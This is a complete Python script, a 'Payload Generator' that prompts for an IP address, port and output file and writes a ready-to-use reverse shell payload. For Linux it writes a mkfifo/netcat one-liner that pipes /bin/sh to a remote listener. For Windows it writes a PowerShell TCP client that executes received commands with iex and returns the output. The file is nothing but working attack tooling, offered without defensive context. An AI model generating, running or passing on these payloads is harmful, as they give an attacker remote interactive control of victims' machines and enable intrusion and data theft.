import os

def create_payload(payload_type, local_ip, local_port, output_file):
    """
    Create a reverse shell payload and save it to a file.

    :param payload_type: Type of payload ('linux' or 'windows')
    :param local_ip: IP address for the reverse connection
    :param local_port: Port for the reverse connection
    :param output_file: File to save the generated payload
    """
    if payload_type == 'linux':
        payload = f"sleep 5;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {local_ip} {local_port} >/tmp/f"
    elif payload_type == 'windows':
        payload = f"powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{local_ip}',{local_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{ $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length) ;$stream.Flush() }}\""
    else:
        print("Error: Unsupported payload type. Use 'linux' or 'windows'.")
        return

    try:
        with open(output_file, 'w') as file:
            file.write(payload)
        print(f"Payload saved to {output_file}")
    except Exception as e:
        print(f"Error saving payload: {e}")

def main():
    print("Payload Generator")
    payload_type = input("Enter payload type (linux/windows): ").strip().lower()
    local_ip = input("Enter local IP address: ").strip()
    local_port = input("Enter local port: ").strip()
    output_file = input("Enter output file name (e.g., payload.sh or payload.ps1): ").strip()

    create_payload(payload_type, local_ip, local_port, output_file)

if __name__ == "__main__":
    main()
